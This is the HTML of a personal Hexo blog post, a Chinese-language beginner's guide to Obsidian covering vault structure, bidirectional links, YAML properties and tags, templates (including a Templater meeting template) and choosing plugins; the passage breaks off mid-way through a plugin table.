@@ -1,0 +1,708 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Obsidian 上手指南——从建库到长期可用 | just.ok的个人博客</title><meta name="author" content="just.ok"><meta name="copyright" content="just.ok"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="如果你也经历过这些：在 Notion 里精心搭了一堆数据库，半年后自己都找不到东西；换笔记软件时发现导出全是乱码；某天服务挂了，几年的记录打不开——那 Obsidian 值得看下去。 它的核心卖点只有一句话：库就是你硬盘上的一个文件夹，里面全是纯文本 .md。这句话决定了它其余全部特性：离线可用、不被锁定、任何编辑器都能打开。 本文功能与价格信息核对到 Obsidian 1.14.4（2026-1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Obsidian 上手指南——从建库到长期可用">
+<meta property="og:url" content="http://blog.just-ok.xyz/posts/e3f80a6/index.html">
+<meta property="og:site_name" content="just.ok的个人博客">
+<meta property="og:description" content="如果你也经历过这些：在 Notion 里精心搭了一堆数据库，半年后自己都找不到东西；换笔记软件时发现导出全是乱码；某天服务挂了，几年的记录打不开——那 Obsidian 值得看下去。 它的核心卖点只有一句话：库就是你硬盘上的一个文件夹，里面全是纯文本 .md。这句话决定了它其余全部特性：离线可用、不被锁定、任何编辑器都能打开。 本文功能与价格信息核对到 Obsidian 1.14.4（2026-1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6908b7d53203f7be00cc7a0f.jpg">
+<meta property="article:published_time" content="2026-10-26T09:20:00.000Z">
+<meta property="article:modified_time" content="2026-10-26T10:35:22.565Z">
+<meta property="article:author" content="just.ok">
+<meta property="article:tag" content="obsidian">
+<meta property="article:tag" content="知识库">
+<meta property="article:tag" content="笔记工具">
+<meta property="article:tag" content="实用tips">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/6908b7d53203f7be00cc7a0f.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Obsidian 上手指南——从建库到长期可用",
+  "url": "http://blog.just-ok.xyz/posts/e3f80a6/",
+  "image": "https://pic1.imgdb.cn/item/6908b7d53203f7be00cc7a0f.jpg",
+  "datePublished": "2026-10-26T09:20:00.000Z",
+  "dateModified": "2026-10-26T10:35:22.565Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "just.ok",
+      "url": "http://blog.just-ok.xyz"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://pic1.imgdb.cn/item/67d9824088c538a9b5c04e68.jpg"><link rel="canonical" href="http://blog.just-ok.xyz/posts/e3f80a6/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":150,"languages":{"author":"作者: just.ok","link":"链接: ","source":"来源: just.ok的个人博客","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Obsidian 上手指南——从建库到长期可用',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/daliyuer.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="/css/categorybar.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://pic1.imgdb.cn/item/67d9821888c538a9b5c04e57.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">34</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">73</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://c6.y.qq.com/base/fcgi-bin/u?__=cNJOP3d6JHix"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://pic1.imgdb.cn/item/6908b7d53203f7be00cc7a0f.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">just.ok的个人博客</span></a><a class="nav-page-title" href="/"><span class="site-name">Obsidian 上手指南——从建库到长期可用</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://c6.y.qq.com/base/fcgi-bin/u?__=cNJOP3d6JHix"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Obsidian 上手指南——从建库到长期可用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-10-26T09:20:00.000Z" title="发表于 2026-10-26 17:20:00">2026-10-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-10-26T10:35:22.565Z" title="更新于 2026-10-26 18:35:22">2026-10-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%9F%A5%E8%AF%86%E5%BA%93/">知识库</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>如果你也经历过这些：在 Notion 里精心搭了一堆数据库，半年后自己都找不到东西；换笔记软件时发现导出全是乱码；某天服务挂了，几年的记录打不开——那 Obsidian 值得看下去。</p>
+<p>它的核心卖点只有一句话：<strong>库就是你硬盘上的一个文件夹，里面全是纯文本 <code>.md</code></strong>。这句话决定了它其余全部特性：离线可用、不被锁定、任何编辑器都能打开。</p>
+<div class="note info flat"><p>本文功能与价格信息核对到 <strong>Obsidian 1.14.4</strong>（2026-10-05 公开发布）。版本迭代较快，具体以<a target="_blank" rel="noopener" href="https://obsidian.md/changelog">官方更新日志</a>为准。</p>
+</div>
+<h2 id="本地优先到底意味着什么"><a href="#本地优先到底意味着什么" class="headerlink" title="本地优先到底意味着什么"></a>本地优先到底意味着什么</h2><p>市面上笔记软件的分歧，本质是数据放谁家。Obsidian 选了另一条路，并且靠”不卖数据”来证明自己：</p>
+<ul>
+<li><strong>离线可用</strong>：没网照样写，不转圈</li>
+<li><strong>不锁数据</strong>：就算哪天 Obsidian 公司消失，笔记一个不丢</li>
+<li><strong>不上报遥测</strong>：官方声明不做用户数据买卖</li>
+<li><strong>商业模式透明</strong>：靠 Sync / Publish 这类可选服务赚钱，而不是卖注意力</li>
+</ul>
+<p>它真正的差异化能力只有三个，其他软件要么没有，要么实现方式不同：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>能力</th>
+<th>Obsidian 的做法</th>
+<th>竞品通常怎么做</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>双向链接</td>
+<td>输入 <code>[[</code> 链接另一篇，被链接方自动记录”谁引用了我”</td>
+<td>Notion 需通过数据库关联维护关系，多数笔记软件无此概念</td>
+</tr>
+<tr>
+<td>图谱 / Canvas</td>
+<td>把笔记关系可视化，或在无限白板上摆卡片</td>
+<td>少数软件有图谱，白板多为独立产品</td>
+</tr>
+<tr>
+<td>数据库化（Bases）</td>
+<td>用 YAML 属性把笔记变成可筛选、可排序的表格或看板</td>
+<td>Notion 有，但数据在云端</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><strong>适合</strong>：需要长期积累且要求可溯源的人（研究者、学生、写作者）、想把文档放进 Git 管理的工程师、介意数据落在别人服务器上的知识工作者。</p>
+<p><strong>不适合</strong>：需要多人实时协同编辑同一页的（请用飞书/腾讯文档/Notion）、想要开箱即用零配置的、只记零散便签的（系统备忘录更快）。</p>
+<h2 id="核心心智模型：库、文件、链接"><a href="#核心心智模型：库、文件、链接" class="headerlink" title="核心心智模型：库、文件、链接"></a>核心心智模型：库、文件、链接</h2><p>新手最容易犯的错，是<strong>拿文件夹思维去用 Obsidian</strong>。先建立这套模型，后面所有操作都顺了。</p>
+<h3 id="库（Vault）"><a href="#库（Vault）" class="headerlink" title="库（Vault）"></a>库（Vault）</h3><p>一个库就是一个文件夹。可以建多个（工作/个人/阅读），但<strong>初期只建一个</strong>——多库会把链接和图谱割裂成几座孤岛。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">我的知识库/                  ← 这就是一个 Vault</span><br><span class="line">├── .obsidian/              ← 配置与插件（别手改）</span><br><span class="line">├── 00-Inbox/               ← 收集箱</span><br><span class="line">├── 10-Projects/            ← 项目</span><br><span class="line">├── 20-Areas/               ← 领域</span><br><span class="line">├── 30-Resources/           ← 资源</span><br><span class="line">├── 40-Archive/             ← 归档</span><br><span class="line">├── 90-Templates/           ← 模板</span><br><span class="line">├── attachments/            ← 附件</span><br><span class="line">└── 首页.md</span><br></pre></td></tr></table></figure>
+<div class="note green icon-padding flat"><i class="note-icon far fa-bell"></i><p><code>.obsidian/</code> 里存着配置、主题、插件设置，其中 <code>workspace.json</code> 记录着窗口布局。手动改它大概率会导致布局错乱，需要重置时用命令面板的”恢复默认布局”更稳。</p>
+</div>
+<h3 id="三条铁律"><a href="#三条铁律" class="headerlink" title="三条铁律"></a>三条铁律</h3><ol>
+<li><strong>链接优先于文件夹</strong>。笔记放哪个文件夹只决定物理位置，它真正的位置由链接决定。新建笔记时至少链到 1～3 篇已有笔记，否则它很快就会消失在文件列表里。</li>
+<li><strong>文件夹只做粗分类</strong>。层级<strong>不超过 3 层</strong>，细分交给标签和属性——它们随时能改，而移动文件会打断链接习惯。</li>
+<li><strong>一页一概念</strong>。别把十个主题塞进一篇长文，原子化笔记才能被复用和组合。长文交给 MOC。</li>
+</ol>
+<h3 id="MOC：只做导航的笔记"><a href="#MOC：只做导航的笔记" class="headerlink" title="MOC：只做导航的笔记"></a>MOC：只做导航的笔记</h3><p>MOC（Map of Content）不含原创内容，只放链接和一句话说明：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># MOC · 分布式系统</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 基础理论</span></span><br><span class="line"><span class="bullet">-</span> [[CAP 定理]] — 一致性、可用性、分区容忍不可兼得</span><br><span class="line"><span class="bullet">-</span> [[BASE 理论]] — CAP 的工程妥协方案</span><br><span class="line"></span><br><span class="line"><span class="section">## 组件</span></span><br><span class="line"><span class="bullet">-</span> [[一致性哈希]] — 数据分片的核心算法</span><br><span class="line"><span class="bullet">-</span> [[Raft 协议]] — 易理解的共识算法</span><br><span class="line"></span><br><span class="line"><span class="section">## 待办</span></span><br><span class="line"><span class="bullet">-</span> [ ] 补齐 [[向量时钟]] 的笔记</span><br></pre></td></tr></table></figure>
+<p>用法：每周回顾时打开图谱，看到成团的聚类就提炼成一个新 MOC。</p>
+<h2 id="30-分钟搭好第一个库"><a href="#30-分钟搭好第一个库" class="headerlink" title="30 分钟搭好第一个库"></a>30 分钟搭好第一个库</h2><p>按顺序做完这 6 件事，能省掉后面 90% 的返工。</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>动作</th>
+<th>位置</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>打开<strong>“自动更新内部链接”</strong></td>
+<td>设置 → 文件与链接</td>
+</tr>
+<tr>
+<td>2</td>
+<td>附件默认位置设为”指定文件夹”，如 <code>attachments</code></td>
+<td>设置 → 文件与链接</td>
+</tr>
+<tr>
+<td>3</td>
+<td>启用<strong>日记、模板、书签、大纲、标签</strong>核心插件</td>
+<td>设置 → 核心插件</td>
+</tr>
+<tr>
+<td>4</td>
+<td>主题选 Minimal（可选）</td>
+<td>设置 → 外观</td>
+</tr>
+<tr>
+<td>5</td>
+<td>建 4～6 个顶层文件夹（照上面那棵树）</td>
+<td>文件列表</td>
+</tr>
+<tr>
+<td>6</td>
+<td>写 <code>首页.md</code> 作为入口，放几个链接</td>
+<td>库根目录</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div class="note green icon-padding flat"><i class="note-icon far fa-bell"></i><p><strong>先别急着装插件。</strong> 用核心功能写够两周，等你明确感到”这里很别扭”，再去搜对应插件——这是几乎所有老用户的共同建议。插件越多，启动越慢，升级越容易坏。</p>
+</div>
+<p>Windows 端建议用 <code>.exe</code> 安装包而不是便携版，这样文件关联、系统”打开方式”才正常。</p>
+<div class="note warning flat"><p>从 1.14 起支持”打开库外的单个 Markdown 文件”，但<strong>必须下载最新安装包重新安装</strong>，仅靠自动更新不够。装完可以把 Obsidian 设为系统默认的 Markdown 打开程序。</p>
+</div>
+<h2 id="必会的-6-个操作"><a href="#必会的-6-个操作" class="headerlink" title="必会的 6 个操作"></a>必会的 6 个操作</h2><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>操作</th>
+<th>快捷键（Win / Mac）</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>快速切换笔记</td>
+<td><code>Ctrl+O</code> / <code>Cmd+O</code></td>
+<td>模糊搜索笔记名，最高频</td>
+</tr>
+<tr>
+<td>命令面板</td>
+<td><code>Ctrl+P</code> / <code>Cmd+P</code></td>
+<td>所有功能都在这里，记不住快捷键就往这找</td>
+</tr>
+<tr>
+<td>全库搜索</td>
+<td><code>Ctrl+Shift+F</code> / <code>Cmd+Shift+F</code></td>
+<td>搜正文内容</td>
+</tr>
+<tr>
+<td>切换编辑/阅读</td>
+<td><code>Ctrl+E</code> / <code>Cmd+E</code></td>
+<td></td>
+</tr>
+<tr>
+<td>重命名</td>
+<td><code>F2</code></td>
+<td>自动更新全库链接，<strong>别用系统文件管理器改名</strong></td>
+</tr>
+<tr>
+<td>分栏 / 新窗口</td>
+<td>拖动标签页到边缘 / 最外侧</td>
+<td><code>Ctrl+Alt+点击</code> 链接 = 新分栏</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>三种编辑模式：<strong>实时预览</strong>（默认，光标行显示语法，日常写作）、<strong>源码模式</strong>（调表格、写复杂语法）、<strong>阅读模式</strong>（纯渲染，不可编辑）。用 <code>Ctrl/Cmd+E</code> 切换。</p>
+<p>书签可以把常用笔记、甚至某次搜索的条件存下来，左侧栏一键直达。</p>
+<h2 id="双向链接：Obsidian-的灵魂"><a href="#双向链接：Obsidian-的灵魂" class="headerlink" title="双向链接：Obsidian 的灵魂"></a>双向链接：Obsidian 的灵魂</h2><p>在 A 里写 <code>[[B]]</code>，是正向链接；B 的右侧面板会自动列出”谁引用了我”，还会带上下文片段，这是反向链接。<strong>你不需要在 B 里手动维护”被 A 引用”</strong>，关系是自动双向的。</p>
+<p>五个真正拉开效率差距的技巧：</p>
+<ol>
+<li><strong>先写链接，后建笔记</strong>。写到一半想引用一个还不存在的概念，直接 <code>[[概念名]]</code> 打下去，它会显示成灰色的”未创建链接”，点一下即创建。这叫自下而上生长，比先设计目录再填内容高效得多。</li>
+<li><strong>用好别名</strong>。在 YAML 写 <code>aliases: [AI, 人工智能]</code>，<code>[[AI]]</code> 和 <code>[[人工智能]]</code> 就指向同一篇，避免同一个东西在不同笔记里叫不同名字。</li>
+<li><strong>块引用</strong>。段落末尾加 <code>^块ID</code>，别处用 <code>[[笔记名#^块ID]]</code> 精确引用这一段，适合引用长文里的某一句。</li>
+<li><strong>区分嵌入和链接</strong>。<code>[[B]]</code> 只是跳转入口；<code>![[B]]</code> 把 B 的内容直接嵌进当前笔记——会议记录嵌进周报就靠这个。</li>
+<li><strong>重命名必须在 Obsidian 里做</strong>。右键重命名或 <code>F2</code>，它会自动改写全库链接；用系统文件管理器改名，链接会全断。</li>
+</ol>
+<div class="note green icon-padding flat"><i class="note-icon far fa-bell"></i><p>图谱视图是<strong>诊断工具</strong>，不是写作界面。调 Filters 隐藏孤立点，按标签或文件夹着色——看到密集团块就是值得提炼的主题，看到孤零零的节点就是该补链接或合并的笔记。每周看一次足矣。</p>
+</div>
+<h2 id="属性与标签怎么分工"><a href="#属性与标签怎么分工" class="headerlink" title="属性与标签怎么分工"></a>属性与标签怎么分工</h2><p>属性就是笔记顶部的 YAML Frontmatter，用 <code>---</code> 包起来：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Raft</span> <span class="string">协议</span></span><br><span class="line"><span class="attr">aliases:</span> [<span class="string">Raft</span>, <span class="string">raft-consensus</span>]</span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">分布式/共识算法</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">状态/已整理</span></span><br><span class="line"><span class="attr">status:</span> <span class="string">进行中</span></span><br><span class="line"><span class="attr">created:</span> <span class="number">2026-10-12</span></span><br><span class="line"><span class="attr">rating:</span> <span class="number">4</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>
+<p>支持的类型：文本（<code>status: 进行中</code>）、列表（<code>tags: [a, b]</code> 或换行写）、数字（<code>rating: 4</code>）、复选框（<code>done: true</code>）、日期（<code>created: 2026-10-12</code>，供排序用）。</p>
+<details class="toggle" style="border: 1px solid #448aff1a"><summary class="toggle-button" style="background-color: #448aff1a;">属性最容易踩的四个坑</summary><div class="toggle-content"><ul>
+<li>三个特殊属性的标准名是 <strong><code>tags</code> / <code>aliases</code> / <code>cssclasses</code></strong>（复数），旧写法 <code>tag</code> / <code>alias</code> / <code>cssclass</code> 自 1.4 起已废弃；且值必须是列表，写单一文本不生效</li>
+<li><code>updated</code> 这类字段<strong>不会自动更新</strong>，要由 Templater 或插件维护</li>
+<li>属性值里可以直接写 <code>[[链接]]</code>，Obsidian 会解析成链接类型</li>
+<li>右侧栏的属性面板可以图形化编辑，不用手敲 YAML；设置里有全局属性视图，能看到整个库用了哪些属性</li>
+</ul>
+</div></details>
+<p>什么时候用属性、什么时候用标签，记住一条分界线就够了：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>场景</th>
+<th>属性</th>
+<th>标签</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>有明确取值范围（状态、评分、日期）</td>
+<td>✓</td>
+<td></td>
+</tr>
+<tr>
+<td>需要排序、筛选、计算、显示成表格列</td>
+<td>✓</td>
+<td></td>
+</tr>
+<tr>
+<td>层级分类（<code>#领域/编程/前端</code>）</td>
+<td></td>
+<td>✓</td>
+</tr>
+<tr>
+<td>临时标记、快速打点</td>
+<td></td>
+<td>✓</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>经验法则：<strong>能用属性描述的结构化信息，就不要塞进标签。</strong></p>
+<p>标签本身也有纪律：全小写、用 <code>/</code> 分层、先定 10 个以内的顶层标签（<code>#项目</code> <code>#领域</code> <code>#资源</code> <code>#状态</code>）再往下细分，别让标签变成第二个文件夹系统。</p>
+<h2 id="模板：从内置到-Templater"><a href="#模板：从内置到-Templater" class="headerlink" title="模板：从内置到 Templater"></a>模板：从内置到 Templater</h2><p>内置模板插件只能填静态变量，够用但很浅：</p>
+<ol>
+<li>设置 → 核心插件 → 打开<strong>模板</strong></li>
+<li>指定模板文件夹，如 <code>90-Templates</code></li>
+<li>写一个模板文件，用 <code>&#123;&#123;date&#125;&#125;</code> <code>&#123;&#123;title&#125;&#125;</code> 这类变量</li>
+<li>使用时：命令面板 → “插入模板”</li>
+</ol>
+<details class="toggle" style="border: 1px solid #448aff1a"><summary class="toggle-button" style="background-color: #448aff1a;">Templater 的会议笔记模板</summary><div class="toggle-content"><p>社区插件 Templater 支持弹窗询问、条件判断、执行 JS、自动移动和重命名文件。一个实用的会议模板：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">created: &lt;% tp.date.now(&quot;YYYY-MM-DD&quot;) %&gt;</span><br><span class="line">type: meeting</span><br><span class="line">attendees: &lt;% await tp.system.prompt(&quot;参会人（逗号分隔）&quot;) %&gt;</span><br><span class="line"><span class="section">status: 待整理</span></span><br><span class="line"><span class="section">---</span></span><br><span class="line"></span><br><span class="line"><span class="section"># &lt;% tp.file.title %&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 议题</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 结论</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 行动项</span></span><br><span class="line"><span class="bullet">-</span> [ ] </span><br></pre></td></tr></table></figure>
+<p>配合它的<strong>文件夹模板</strong>功能，可以实现”新建到某个文件夹就自动套模板”，全程零手动。</p>
+</div></details>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>插件</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Templater</td>
+<td>动态模板，首选</td>
+</tr>
+<tr>
+<td>QuickAdd</td>
+<td>一键捕获、宏命令、批量创建</td>
+</tr>
+<tr>
+<td>Periodic Notes</td>
+<td>周记 / 月记 / 季记</td>
+</tr>
+<tr>
+<td>Calendar</td>
+<td>日历式浏览与创建日记</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="插件：少而准"><a href="#插件：少而准" class="headerlink" title="插件：少而准"></a>插件：少而准</h2><p>核心插件是官方内置、免费、安全的；社区插件是第三方写的，<strong>能读你库里所有文件</strong>。截至 2026 年 10 月，官方社区目录已有 9000+ 个插件、900+ 个主题，这个数字还在涨。</p>
+<p>筛选只看三条：</p>
+<ol>
+<li><strong>最近提交时间</strong>：超过一年没更新的，谨慎（Obsidian 迭代快，容易失修）</li>
+<li><strong>issue 状态</strong>：开放一堆且无人回应的，避开</li>
+<li><strong>能否被核心功能替代</strong>：能替代就别装</li>
+</ol>
+<div class="note warning flat"><p>打开来源不明的库有风险——里面可能捆绑恶意插件配置。从 1.14 起，打开不受信任的库时，主题和代码片段会被临时禁用，直到你确认信任作者。点 <code>obsidian://</code> 链接同理，从 1.13 起会先弹确认框。</p>
+</div>
+<p>值得先了解的插件，按需求挑，不要全装：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>插件</th>
+<th>适用场景</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Templater</td>
+<td>动态模板（见上节）</td>
+</tr>
+<tr>
+<td>Style Settings</td>
+<td>给支持它的主题提供可视化调节</td>
+</tr>
+<tr>
+<td>Excalidraw</td>
+<td>手绘风格图表</td>
+</tr>
+<tr>
+<td>Omnisearch</td>
